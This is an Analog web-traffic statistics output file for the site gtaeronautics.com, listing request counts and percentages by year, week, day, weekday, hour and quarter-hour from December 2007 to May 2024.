x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2024	05	29	02	08
x	FR	2007	12	18	17	05
x	LR	2024	05	28	04	55
x	E7	2024	05	29	02	08
x	SR	1933339
x	S7	7183
x	NC	654105
x	C7	0
x	FL	766570
x	F7	1534
x	RR	254
x	R7	0
x	NH	113099
x	H7	439
x	BT	57520368399
x	B7	0
1	Rr	329133	17.024	2024
1	Rr	511208	26.442	2023
1	Rr	82334	4.259	2022
1	Rr	98917	5.116	2021
1	Rr	89380	4.623	2020
1	Rr	80088	4.142	2019
1	Rr	68927	3.565	2018
1	Rr	60168	3.112	2017
1	Rr	73316	3.792	2016
1	Rr	80796	4.179	2015
1	Rr	110773	5.730	2014
1	Rr	65173	3.371	2013
1	Rr	60742	3.142	2012
1	Rr	57015	2.949	2011
1	Rr	22139	1.145	2010
1	Rr	69710	3.606	2009
1	Rr	71820	3.715	2008
1	Rr	1700	0.088	2007
1	*BT	R	511208	2023
W	Rr	1796	0.093	2016	07	24
W	Rr	1171	0.061	2016	07	17
W	Rr	1167	0.060	2016	07	10
W	Rr	917	0.047	2016	07	03
W	Rr	920	0.048	2016	06	26
W	Rr	1179	0.061	2016	06	19
W	Rr	1288	0.067	2016	06	12
W	Rr	1237	0.064	2016	06	05
W	Rr	1263	0.065	2016	05	29
W	Rr	1338	0.069	2016	05	22
W	Rr	1184	0.061	2016	05	15
W	Rr	1365	0.071	2016	05	08
W	Rr	974	0.050	2016	05	01
W	Rr	1311	0.068	2016	04	24
W	Rr	1127	0.058	2016	04	17
W	Rr	1248	0.065	2016	04	10
W	Rr	1451	0.075	2016	04	03
W	Rr	987	0.051	2016	03	27
W	Rr	1233	0.064	2016	03	20
W	Rr	1347	0.070	2016	03	13
W	Rr	1347	0.070	2016	03	06
W	Rr	1236	0.064	2016	02	28
W	Rr	1422	0.074	2016	02	21
W	Rr	1085	0.056	2016	02	14
W	Rr	1427	0.074	2016	02	07
W	Rr	1359	0.070	2016	01	31
W	Rr	1708	0.088	2016	01	24
W	Rr	1476	0.076	2016	01	17
W	Rr	1563	0.081	2016	01	10
W	Rr	1381	0.071	2016	01	03
W	Rr	1273	0.066	2015	12	27
W	Rr	1084	0.056	2015	12	20
W	Rr	1344	0.070	2015	12	13
W	Rr	1336	0.069	2015	12	06
W	Rr	1123	0.058	2015	11	29
W	Rr	960	0.050	2015	11	22
W	Rr	1337	0.069	2015	11	15
W	Rr	1400	0.072	2015	11	08
W	Rr	1383	0.072	2015	11	01
W	Rr	1250	0.065	2015	10	25
W	Rr	1366	0.071	2015	10	18
W	Rr	1367	0.071	2015	10	11
W	Rr	1214	0.063	2015	10	04
W	Rr	1152	0.060	2015	09	27
W	Rr	1387	0.072	2015	09	20
W	Rr	1655	0.086	2015	09	13
W	Rr	1526	0.079	2015	09	06
W	Rr	1242	0.064	2015	08	30
W	Rr	1800	0.093	2015	08	23
W	Rr	1527	0.079	2015	08	16
W	Rr	1386	0.072	2015	08	09
W	Rr	1593	0.082	2015	08	02
W	Rr	1567	0.081	2015	07	26
W	Rr	1980	0.102	2015	07	19
W	Rr	2180	0.113	2015	07	12
W	Rr	2008	0.104	2015	07	05
W	Rr	2297	0.119	2015	06	28
W	Rr	1556	0.080	2015	06	21
W	Rr	1380	0.071	2015	06	14
W	Rr	2013	0.104	2015	06	07
W	Rr	1651	0.085	2015	05	31
W	Rr	1224	0.063	2015	05	24
W	Rr	1355	0.070	2015	05	17
W	Rr	1179	0.061	2015	05	10
W	Rr	1436	0.074	2015	05	03
W	Rr	1671	0.086	2015	04	26
W	Rr	1878	0.097	2015	04	19
W	Rr	2326	0.120	2015	04	12
W	Rr	2636	0.136	2015	04	05
W	Rr	2297	0.119	2015	03	29
W	Rr	1237	0.064	2015	03	22
W	Rr	1453	0.075	2015	03	15
W	Rr	1399	0.072	2015	03	08
W	Rr	1287	0.067	2015	03	01
W	Rr	1249	0.065	2015	02	22
W	Rr	1373	0.071	2015	02	15
W	Rr	1790	0.093	2015	02	08
W	Rr	1672	0.086	2015	02	01
W	Rr	1543	0.080	2015	01	25
W	Rr	1463	0.076	2015	01	18
W	Rr	1696	0.088	2015	01	11
W	Rr	1707	0.088	2015	01	04
W	Rr	1833	0.095	2014	12	28
W	Rr	1335	0.069	2014	12	21
W	Rr	1644	0.085	2014	12	14
W	Rr	1541	0.080	2014	12	07
W	Rr	1335	0.069	2014	11	30
W	Rr	1262	0.065	2014	11	23
W	Rr	2009	0.104	2014	11	16
W	Rr	1566	0.081	2014	11	09
W	Rr	1814	0.094	2014	11	02
W	Rr	1452	0.075	2014	10	26
W	Rr	1642	0.085	2014	10	19
W	Rr	1795	0.093	2014	10	12
W	Rr	1836	0.095	2014	10	05
W	Rr	1662	0.086	2014	09	28
W	Rr	1843	0.095	2014	09	21
W	Rr	1678	0.087	2014	09	14
W	Rr	1598	0.083	2014	09	07
W	Rr	1418	0.073	2014	08	31
W	Rr	1584	0.082	2014	08	24
W	Rr	1571	0.081	2014	08	17
W	Rr	1727	0.089	2014	08	10
W	Rr	1927	0.100	2014	08	03
W	Rr	1691	0.087	2014	07	27
W	Rr	1702	0.088	2014	07	20
W	Rr	1624	0.084	2014	07	13
W	Rr	1831	0.095	2014	07	06
W	Rr	1867	0.097	2014	06	29
W	Rr	1927	0.100	2014	06	22
W	Rr	2134	0.110	2014	06	15
W	Rr	4851	0.251	2014	06	08
W	Rr	2293	0.119	2014	06	01
W	Rr	3180	0.164	2014	05	25
W	Rr	1468	0.076	2014	05	18
W	Rr	1808	0.094	2014	05	11
W	Rr	1998	0.103	2014	05	04
W	Rr	1876	0.097	2014	04	27
W	Rr	2330	0.121	2014	04	20
W	Rr	2565	0.133	2014	04	13
W	Rr	2652	0.137	2014	04	06
W	Rr	2574	0.133	2014	03	30
W	Rr	1186	0.061	2014	03	23
W	Rr	1305	0.067	2014	03	16
W	Rr	2273	0.118	2014	03	09
W	Rr	2231	0.115	2014	03	02
W	Rr	1925	0.100	2014	02	23
W	Rr	7060	0.365	2014	02	16
W	Rr	2854	0.148	2014	02	09
W	Rr	3190	0.165	2014	02	02
W	Rr	3743	0.194	2014	01	26
W	Rr	3643	0.188	2014	01	19
W	Rr	2961	0.153	2014	01	12
W	Rr	2319	0.120	2014	01	05
W	Rr	981	0.051	2013	12	29
W	Rr	1108	0.057	2013	12	22
W	Rr	1226	0.063	2013	12	15
W	Rr	1285	0.066	2013	12	08
W	Rr	1289	0.067	2013	12	01
W	Rr	1404	0.073	2013	11	24
W	Rr	1142	0.059	2013	11	17
W	Rr	1334	0.069	2013	11	10
W	Rr	1277	0.066	2013	11	03
W	Rr	1035	0.054	2013	10	27
W	Rr	1309	0.068	2013	10	20
W	Rr	1302	0.067	2013	10	13
W	Rr	1432	0.074	2013	10	06
W	Rr	1178	0.061	2013	09	29
W	Rr	947	0.049	2013	09	22
W	Rr	1254	0.065	2013	09	15
W	Rr	1099	0.057	2013	09	08
W	Rr	1053	0.054	2013	09	01
W	Rr	1010	0.052	2013	08	25
W	Rr	1102	0.057	2013	08	18
W	Rr	1063	0.055	2013	08	11
W	Rr	1105	0.057	2013	08	04
W	Rr	1377	0.071	2013	07	28
W	Rr	1498	0.077	2013	07	21
W	Rr	1295	0.067	2013	07	14
W	Rr	1237	0.064	2013	07	07
W	Rr	1003	0.052	2013	06	30
W	Rr	1275	0.066	2013	06	23
W	Rr	1072	0.055	2013	06	16
W	Rr	1249	0.065	2013	06	09
W	Rr	1521	0.079	2013	06	02
W	Rr	1256	0.065	2013	05	26
W	Rr	1091	0.056	2013	05	19
W	Rr	1359	0.070	2013	05	12
W	Rr	1130	0.058	2013	05	05
W	Rr	1215	0.063	2013	04	28
W	Rr	1368	0.071	2013	04	21
W	Rr	1318	0.068	2013	04	14
W	Rr	1408	0.073	2013	04	07
W	Rr	1277	0.066	2013	03	31
W	Rr	1452	0.075	2013	03	24
W	Rr	1418	0.073	2013	03	17
W	Rr	1217	0.063	2013	03	10
W	Rr	1490	0.077	2013	03	03
W	Rr	1353	0.070	2013	02	24
W	Rr	1268	0.066	2013	02	17
W	Rr	1274	0.066	2013	02	10
W	Rr	1153	0.060	2013	02	03
W	Rr	1266	0.065	2013	01	27
W	Rr	1271	0.066	2013	01	20
W	Rr	1449	0.075	2013	01	13
W	Rr	1253	0.065	2013	01	06
W	Rr	1309	0.068	2012	12	30
W	Rr	1156	0.060	2012	12	23
W	Rr	1336	0.069	2012	12	16
W	Rr	1575	0.081	2012	12	09
W	Rr	1087	0.056	2012	12	02
W	Rr	1376	0.071	2012	11	25
W	Rr	1136	0.059	2012	11	18
W	Rr	1341	0.069	2012	11	11
W	Rr	1418	0.073	2012	11	04
W	Rr	1103	0.057	2012	10	28
W	Rr	1200	0.062	2012	10	21
W	Rr	1382	0.071	2012	10	14
W	Rr	1127	0.058	2012	10	07
W	Rr	1187	0.061	2012	09	30
W	Rr	1172	0.061	2012	09	23
W	Rr	1034	0.053	2012	09	16
W	Rr	944	0.049	2012	09	09
W	Rr	958	0.050	2012	09	02
W	Rr	734	0.038	2012	08	26
W	Rr	881	0.046	2012	08	19
W	Rr	874	0.045	2012	08	12
W	Rr	973	0.050	2012	08	05
W	Rr	1010	0.052	2012	07	29
W	Rr	943	0.049	2012	07	22
W	Rr	1089	0.056	2012	07	15
W	Rr	888	0.046	2012	07	08
W	Rr	845	0.044	2012	07	01
W	Rr	1070	0.055	2012	06	24
W	Rr	1050	0.054	2012	06	17
W	Rr	1271	0.066	2012	06	10
W	Rr	957	0.049	2012	06	03
W	Rr	1249	0.065	2012	05	27
W	Rr	1055	0.055	2012	05	20
W	Rr	1392	0.072	2012	05	13
W	Rr	1140	0.059	2012	05	06
W	Rr	1807	0.093	2012	04	29
W	Rr	1225	0.063	2012	04	22
W	Rr	1264	0.065	2012	04	15
W	Rr	1075	0.056	2012	04	08
W	Rr	1261	0.065	2012	04	01
W	Rr	1345	0.070	2012	03	25
W	Rr	1254	0.065	2012	03	18
W	Rr	1478	0.076	2012	03	11
W	Rr	1503	0.078	2012	03	04
W	Rr	1532	0.079	2012	02	26
W	Rr	1464	0.076	2012	02	19
W	Rr	1154	0.060	2012	02	12
W	Rr	1240	0.064	2012	02	05
W	Rr	1088	0.056	2012	01	29
W	Rr	1125	0.058	2012	01	22
W	Rr	60	0.003	2012	01	15
W	Rr	1472	0.076	2012	01	08
W	Rr	1122	0.058	2012	01	01
W	Rr	888	0.046	2011	12	25
W	Rr	1360	0.070	2011	12	18
W	Rr	1486	0.077	2011	12	11
W	Rr	1330	0.069	2011	12	04
W	Rr	1094	0.057	2011	11	27
W	Rr	1062	0.055	2011	11	20
W	Rr	1123	0.058	2011	11	13
W	Rr	975	0.050	2011	11	06
W	Rr	1264	0.065	2011	10	30
W	Rr	1140	0.059	2011	10	23
W	Rr	1211	0.063	2011	10	16
W	Rr	1236	0.064	2011	10	09
W	Rr	1128	0.058	2011	10	02
W	Rr	1083	0.056	2011	09	25
W	Rr	1451	0.075	2011	09	18
W	Rr	1278	0.066	2011	09	11
W	Rr	1219	0.063	2011	09	04
W	Rr	1316	0.068	2011	08	28
W	Rr	1119	0.058	2011	08	21
W	Rr	1484	0.077	2011	08	14
W	Rr	1671	0.086	2011	08	07
W	Rr	1319	0.068	2011	07	31
W	Rr	1197	0.062	2011	07	24
W	Rr	1504	0.078	2011	07	17
W	Rr	1367	0.071	2011	07	10
W	Rr	1205	0.062	2011	07	03
W	Rr	1333	0.069	2011	06	26
W	Rr	1059	0.055	2011	06	19
W	Rr	1353	0.070	2011	06	12
W	Rr	1275	0.066	2011	06	05
W	Rr	983	0.051	2011	05	29
W	Rr	1262	0.065	2011	05	22
W	Rr	1374	0.071	2011	05	15
W	Rr	1076	0.056	2011	05	08
W	Rr	0	0.000	2011	05	01
W	Rr	0	0.000	2011	04	24
W	Rr	0	0.000	2011	04	17
W	Rr	0	0.000	2011	04	10
W	Rr	0	0.000	2011	04	03
W	Rr	0	0.000	2011	03	27
W	Rr	24	0.001	2011	03	20
W	Rr	1317	0.068	2011	03	13
W	Rr	1258	0.065	2011	03	06
W	Rr	1372	0.071	2011	02	27
W	Rr	1226	0.063	2011	02	20
W	Rr	1524	0.079	2011	02	13
W	Rr	1366	0.071	2011	02	06
W	Rr	958	0.050	2011	01	30
W	Rr	1273	0.066	2011	01	23
W	Rr	1560	0.081	2011	01	16
W	Rr	1472	0.076	2011	01	09
W	Rr	1310	0.068	2011	01	02
W	Rr	798	0.041	2010	12	26
W	Rr	935	0.048	2010	12	19
W	Rr	0	0.000	2010	12	12
W	Rr	0	0.000	2010	12	05
W	Rr	0	0.000	2010	11	28
W	Rr	0	0.000	2010	11	21
W	Rr	0	0.000	2010	11	14
W	Rr	0	0.000	2010	11	07
W	Rr	0	0.000	2010	10	31
W	Rr	0	0.000	2010	10	24
W	Rr	0	0.000	2010	10	17
W	Rr	0	0.000	2010	10	10
W	Rr	0	0.000	2010	10	03
W	Rr	0	0.000	2010	09	26
W	Rr	0	0.000	2010	09	19
W	Rr	0	0.000	2010	09	12
W	Rr	0	0.000	2010	09	05
W	Rr	0	0.000	2010	08	29
W	Rr	0	0.000	2010	08	22
W	Rr	0	0.000	2010	08	15
W	Rr	0	0.000	2010	08	08
W	Rr	0	0.000	2010	08	01
W	Rr	0	0.000	2010	07	25
W	Rr	0	0.000	2010	07	18
W	Rr	0	0.000	2010	07	11
W	Rr	0	0.000	2010	07	04
W	Rr	15	0.001	2010	06	27
W	Rr	914	0.047	2010	06	20
W	Rr	1104	0.057	2010	06	13
W	Rr	1096	0.057	2010	06	06
W	Rr	1171	0.061	2010	05	30
W	Rr	1115	0.058	2010	05	23
W	Rr	1170	0.061	2010	05	16
W	Rr	1334	0.069	2010	05	09
W	Rr	1109	0.057	2010	05	02
W	Rr	1067	0.055	2010	04	25
W	Rr	1212	0.063	2010	04	18
W	Rr	1054	0.055	2010	04	11
W	Rr	1325	0.069	2010	04	04
W	Rr	811	0.042	2010	03	28
W	Rr	1195	0.062	2010	03	21
W	Rr	1338	0.069	2010	03	14
W	Rr	1113	0.058	2010	03	07
W	Rr	1103	0.057	2010	02	28
W	Rr	1290	0.067	2010	02	21
W	Rr	0	0.000	2010	02	14
W	Rr	0	0.000	2010	02	07
W	Rr	0	0.000	2010	01	31
W	Rr	0	0.000	2010	01	24
W	Rr	0	0.000	2010	01	17
W	Rr	0	0.000	2010	01	10
W	Rr	0	0.000	2010	01	03
W	Rr	78	0.004	2009	12	27
W	Rr	945	0.049	2009	12	20
W	Rr	1140	0.059	2009	12	13
W	Rr	1323	0.068	2009	12	06
W	Rr	1518	0.079	2009	11	29
W	Rr	1352	0.070	2009	11	22
W	Rr	1346	0.070	2009	11	15
W	Rr	1416	0.073	2009	11	08
W	Rr	1734	0.090	2009	11	01
W	Rr	1035	0.054	2009	10	25
W	Rr	1297	0.067	2009	10	18
W	Rr	1267	0.066	2009	10	11
W	Rr	1440	0.074	2009	10	04
W	Rr	1521	0.079	2009	09	27
W	Rr	1121	0.058	2009	09	20
W	Rr	875	0.045	2009	09	13
W	Rr	1032	0.053	2009	09	06
W	Rr	1283	0.066	2009	08	30
W	Rr	1214	0.063	2009	08	23
W	Rr	1402	0.073	2009	08	16
W	Rr	1260	0.065	2009	08	09
W	Rr	1404	0.073	2009	08	02
W	Rr	1380	0.071	2009	07	26
W	Rr	1470	0.076	2009	07	19
W	Rr	1750	0.091	2009	07	12
W	Rr	1847	0.096	2009	07	05
W	Rr	1889	0.098	2009	06	28
W	Rr	1312	0.068	2009	06	21
W	Rr	1093	0.057	2009	06	14
W	Rr	1363	0.070	2009	06	07
W	Rr	1251	0.065	2009	05	31
W	Rr	1352	0.070	2009	05	24
W	Rr	1133	0.059	2009	05	17
W	Rr	1887	0.098	2009	05	10
W	Rr	1369	0.071	2009	05	03
W	Rr	1089	0.056	2009	04	26
W	Rr	1160	0.060	2009	04	19
W	Rr	1189	0.061	2009	04	12
W	Rr	1529	0.079	2009	04	05
W	Rr	1155	0.060	2009	03	29
W	Rr	1230	0.064	2009	03	22
W	Rr	1029	0.053	2009	03	15
W	Rr	1234	0.064	2009	03	08
W	Rr	1486	0.077	2009	03	01
W	Rr	1470	0.076	2009	02	22
W	Rr	1198	0.062	2009	02	15
W	Rr	1802	0.093	2009	02	08
W	Rr	1653	0.085	2009	02	01
W	Rr	1346	0.070	2009	01	25
W	Rr	1431	0.074	2009	01	18
W	Rr	1678	0.087	2009	01	11
W	Rr	1591	0.082	2009	01	04
W	Rr	886	0.046	2008	12	28
W	Rr	1148	0.059	2008	12	21
W	Rr	1428	0.074	2008	12	14
W	Rr	1508	0.078	2008	12	07
W	Rr	1194	0.062	2008	11	30
W	Rr	1070	0.055	2008	11	23
W	Rr	1396	0.072	2008	11	16
W	Rr	1255	0.065	2008	11	09
W	Rr	1314	0.068	2008	11	02
W	Rr	1397	0.072	2008	10	26
W	Rr	1638	0.085	2008	10	19
W	Rr	1298	0.067	2008	10	12
W	Rr	430	0.022	2008	10	05
W	Rr	723	0.037	2008	09	28
W	Rr	1308	0.068	2008	09	21
W	Rr	1242	0.064	2008	09	14
W	Rr	1409	0.073	2008	09	07
W	Rr	1142	0.059	2008	08	31
W	Rr	1022	0.053	2008	08	24
W	Rr	1062	0.055	2008	08	17
W	Rr	1188	0.061	2008	08	10
W	Rr	1232	0.064	2008	08	03
W	Rr	1050	0.054	2008	07	27
W	Rr	1272	0.066	2008	07	20
W	Rr	1305	0.067	2008	07	13
W	Rr	1093	0.057	2008	07	06
W	Rr	1182	0.061	2008	06	29
W	Rr	1937	0.100	2008	06	22
W	Rr	1493	0.077	2008	06	15
W	Rr	1083	0.056	2008	06	08
W	Rr	1283	0.066	2008	06	01
W	Rr	1432	0.074	2008	05	25
W	Rr	1726	0.089	2008	05	18
W	Rr	1580	0.082	2008	05	11
W	Rr	2661	0.138	2008	05	04
W	Rr	3648	0.189	2008	04	27
W	Rr	1400	0.072	2008	04	20
W	Rr	1365	0.071	2008	04	13
W	Rr	1213	0.063	2008	04	06
W	Rr	1670	0.086	2008	03	30
W	Rr	1211	0.063	2008	03	23
W	Rr	1144	0.059	2008	03	16
W	Rr	1301	0.067	2008	03	09
W	Rr	1292	0.067	2008	03	02
W	Rr	1427	0.074	2008	02	24
W	Rr	2207	0.114	2008	02	17
W	Rr	1124	0.058	2008	02	10
W	Rr	1561	0.081	2008	02	03
W	Rr	1533	0.079	2008	01	27
W	Rr	1389	0.072	2008	01	20
W	Rr	1133	0.059	2008	01	13
W	Rr	1404	0.073	2008	01	06
W	Rr	976	0.050	2007	12	30
W	Rr	801	0.041	2007	12	23
W	Rr	675	0.035	2007	12	16
W	*BT	R	26220	2024	01	28
D	Rr	189	0.010	2024	05	28
D	Rr	352	0.018	2024	05	27
D	Rr	609	0.031	2024	05	26
D	Rr	1262	0.065	2024	05	25
D	Rr	823	0.043	2024	05	24
D	Rr	1806	0.093	2024	05	23
D	Rr	2196	0.114	2024	05	22
D	Rr	2040	0.106	2024	05	21
D	Rr	3204	0.166	2024	05	20
D	Rr	1872	0.097	2024	05	19
D	Rr	2256	0.117	2024	05	18
D	Rr	2814	0.146	2024	05	17
D	Rr	1896	0.098	2024	05	16
D	Rr	1794	0.093	2024	05	15
D	Rr	2232	0.115	2024	05	14
D	Rr	2160	0.112	2024	05	13
D	Rr	1194	0.062	2024	05	12
D	Rr	2106	0.109	2024	05	11
D	Rr	2712	0.140	2024	05	10
D	Rr	2058	0.106	2024	05	09
D	Rr	2922	0.151	2024	05	08
D	Rr	2832	0.146	2024	05	07
D	Rr	3162	0.164	2024	05	06
D	Rr	1728	0.089	2024	05	05
D	Rr	1494	0.077	2024	05	04
D	Rr	3282	0.170	2024	05	03
D	Rr	3804	0.197	2024	05	02
D	Rr	2189	0.113	2024	05	01
D	Rr	2530	0.131	2024	04	30
D	Rr	3120	0.161	2024	04	29
D	Rr	1205	0.062	2024	04	28
D	Rr	875	0.045	2024	04	27
D	Rr	1520	0.079	2024	04	26
D	Rr	2536	0.131	2024	04	25
D	Rr	3144	0.163	2024	04	24
D	Rr	2538	0.131	2024	04	23
D	Rr	3678	0.190	2024	04	22
D	Rr	1314	0.068	2024	04	21
D	Rr	1560	0.081	2024	04	20
D	Rr	1086	0.056	2024	04	19
D	Rr	1776	0.092	2024	04	18
D	Rr	2172	0.112	2024	04	17
D	*BT	R	9912	2024	01	29
d	Rr	227437	11.764	Sun
d	Rr	317126	16.403	Mon
d	Rr	315241	16.306	Tue
d	Rr	314952	16.291	Wed
d	Rr	306700	15.864	Thu
d	Rr	283567	14.667	Fri
d	Rr	168316	8.706	Sat
H	Rr	4	0.000	2024	05	28	04
H	Rr	2	0.000	2024	05	28	03
H	Rr	167	0.009	2024	05	28	02
H	Rr	4	0.000	2024	05	28	01
H	Rr	12	0.001	2024	05	28	00
H	Rr	3	0.000	2024	05	27	23
H	Rr	11	0.001	2024	05	27	22
H	Rr	3	0.000	2024	05	27	21
H	Rr	0	0.000	2024	05	27	20
H	Rr	8	0.000	2024	05	27	19
H	Rr	3	0.000	2024	05	27	18
H	Rr	6	0.000	2024	05	27	17
H	Rr	5	0.000	2024	05	27	16
H	Rr	47	0.002	2024	05	27	15
H	Rr	38	0.002	2024	05	27	14
H	Rr	5	0.000	2024	05	27	13
H	Rr	8	0.000	2024	05	27	12
H	Rr	9	0.000	2024	05	27	11
H	Rr	1	0.000	2024	05	27	10
H	Rr	6	0.000	2024	05	27	09
H	Rr	5	0.000	2024	05	27	08
H	Rr	4	0.000	2024	05	27	07
H	Rr	11	0.001	2024	05	27	06
H	Rr	95	0.005	2024	05	27	05
H	Rr	2	0.000	2024	05	27	04
H	Rr	8	0.000	2024	05	27	03
H	Rr	2	0.000	2024	05	27	02
H	Rr	42	0.002	2024	05	27	01
H	Rr	30	0.002	2024	05	27	00
H	Rr	12	0.001	2024	05	26	23
H	Rr	8	0.000	2024	05	26	22
H	Rr	158	0.008	2024	05	26	21
H	Rr	112	0.006	2024	05	26	20
H	Rr	0	0.000	2024	05	26	19
H	Rr	14	0.001	2024	05	26	18
H	Rr	6	0.000	2024	05	26	17
H	Rr	8	0.000	2024	05	26	16
H	Rr	2	0.000	2024	05	26	15
H	Rr	8	0.000	2024	05	26	14
H	Rr	78	0.004	2024	05	26	13
H	Rr	12	0.001	2024	05	26	12
H	Rr	4	0.000	2024	05	26	11
H	Rr	8	0.000	2024	05	26	10
H	Rr	28	0.001	2024	05	26	09
H	Rr	6	0.000	2024	05	26	08
H	Rr	62	0.003	2024	05	26	07
H	Rr	16	0.001	2024	05	26	06
H	Rr	10	0.001	2024	05	26	05
H	Rr	3	0.000	2024	05	26	04
H	Rr	9	0.000	2024	05	26	03
H	Rr	12	0.001	2024	05	26	02
H	Rr	6	0.000	2024	05	26	01
H	Rr	27	0.001	2024	05	26	00
H	Rr	3	0.000	2024	05	25	23
H	Rr	18	0.001	2024	05	25	22
H	Rr	21	0.001	2024	05	25	21
H	Rr	24	0.001	2024	05	25	20
H	Rr	18	0.001	2024	05	25	19
H	Rr	117	0.006	2024	05	25	18
H	Rr	12	0.001	2024	05	25	17
H	Rr	105	0.005	2024	05	25	16
H	Rr	63	0.003	2024	05	25	15
H	Rr	159	0.008	2024	05	25	14
H	Rr	21	0.001	2024	05	25	13
H	Rr	36	0.002	2024	05	25	12
H	Rr	147	0.008	2024	05	25	11
H	Rr	87	0.004	2024	05	25	10
H	Rr	30	0.002	2024	05	25	09
H	Rr	21	0.001	2024	05	25	08
H	Rr	15	0.001	2024	05	25	07
H	Rr	15	0.001	2024	05	25	06
H	Rr	18	0.001	2024	05	25	05
H	*BT	R	1638	2024	01	29	20
h	Rr	75643	3.913	00
h	Rr	70385	3.641	01
h	Rr	72667	3.759	02
h	Rr	74307	3.843	03
h	Rr	72545	3.752	04
h	Rr	70957	3.670	05
h	Rr	66921	3.461	06
h	Rr	64841	3.354	07
h	Rr	62609	3.238	08
h	Rr	61612	3.187	09
h	Rr	64967	3.360	10
h	Rr	66672	3.449	11
h	Rr	66757	3.453	12
h	Rr	73709	3.813	13
h	Rr	90250	4.668	14
h	Rr	93758	4.850	15
h	Rr	105704	5.467	16
h	Rr	105685	5.466	17
h	Rr	107796	5.576	18
h	Rr	105452	5.454	19
h	Rr	100356	5.191	20
h	Rr	92805	4.800	21
h	Rr	86422	4.470	22
h	Rr	80519	4.165	23
4	Rr	3	0.000	2024	05	28	04	30
4	Rr	0	0.000	2024	05	28	04	15
4	Rr	1	0.000	2024	05	28	04	00
4	Rr	0	0.000	2024	05	28	03	45
4	Rr	2	0.000	2024	05	28	03	30
4	Rr	0	0.000	2024	05	28	03	15
4	Rr	0	0.000	2024	05	28	03	00
4	Rr	6	0.000	2024	05	28	02	45
4	Rr	0	0.000	2024	05	28	02	30
4	Rr	18	0.001	2024	05	28	02	15
4	Rr	143	0.007	2024	05	28	02	00
4	Rr	0	0.000	2024	05	28	01	45
4	Rr	1	0.000	2024	05	28	01	30
4	Rr	2	0.000	2024	05	28	01	15
4	Rr	1	0.000	2024	05	28	01	00
4	Rr	8	0.000	2024	05	28	00	45
4	Rr	1	0.000	2024	05	28	00	30
4	Rr	0	0.000	2024	05	28	00	15
4	Rr	3	0.000	2024	05	28	00	00
4	Rr	2	0.000	2024	05	27	23	45
4	Rr	0	0.000	2024	05	27	23	30
4	Rr	0	0.000	2024	05	27	23	15
4	Rr	1	0.000	2024	05	27	23	00
4	Rr	0	0.000	2024	05	27	22	45
4	Rr	8	0.000	2024	05	27	22	30
4	Rr	2	0.000	2024	05	27	22	15
4	Rr	1	0.000	2024	05	27	22	00
4	Rr	2	0.000	2024	05	27	21	45
4	Rr	0	0.000	2024	05	27	21	30
4	Rr	1	0.000	2024	05	27	21	15
4	Rr	0	0.000	2024	05	27	21	00
4	Rr	0	0.000	2024	05	27	20	45
4	Rr	0	0.000	2024	05	27	20	30
4	Rr	0	0.000	2024	05	27	20	15
4	Rr	0	0.000	2024	05	27	20	00
4	Rr	2	0.000	2024	05	27	19	45
4	Rr	2	0.000	2024	05	27	19	30
4	Rr	1	0.000	2024	05	27	19	15
4	Rr	3	0.000	2024	05	27	19	00
4	Rr	0	0.000	2024	05	27	18	45
4	Rr	1	0.000	2024	05	27	18	30
4	Rr	2	0.000	2024	05	27	18	15
4	Rr	0	0.000	2024	05	27	18	00
4	Rr	2	0.000	2024	05	27	17	45
4	Rr	0	0.000	2024	05	27	17	30
4	Rr	4	0.000	2024	05	27	17	15
4	Rr	0	0.000	2024	05	27	17	00
4	Rr	0	0.000	2024	05	27	16	45
4	Rr	0	0.000	2024	05	27	16	30
4	Rr	4	0.000	2024	05	27	16	15
4	Rr	1	0.000	2024	05	27	16	00
4	Rr	1	0.000	2024	05	27	15	45
4	Rr	38	0.002	2024	05	27	15	30
4	Rr	8	0.000	2024	05	27	15	15
4	Rr	0	0.000	2024	05	27	15	00
4	Rr	1	0.000	2024	05	27	14	45
4	Rr	0	0.000	2024	05	27	14	30
4	Rr	0	0.000	2024	05	27	14	15
4	Rr	37	0.002	2024	05	27	14	00
4	Rr	1	0.000	2024	05	27	13	45
4	Rr	2	0.000	2024	05	27	13	30
4	Rr	0	0.000	2024	05	27	13	15
4	Rr	2	0.000	2024	05	27	13	00
4	Rr	2	0.000	2024	05	27	12	45
4	Rr	0	0.000	2024	05	27	12	30
4	Rr	0	0.000	2024	05	27	12	15
4	Rr	6	0.000	2024	05	27	12	00
4	Rr	3	0.000	2024	05	27	11	45
4	Rr	6	0.000	2024	05	27	11	30
4	Rr	0	0.000	2024	05	27	11	15
4	Rr	0	0.000	2024	05	27	11	00
4	Rr	0	0.000	2024	05	27	10	45
4	Rr	1	0.000	2024	05	27	10	30
4	Rr	0	0.000	2024	05	27	10	15
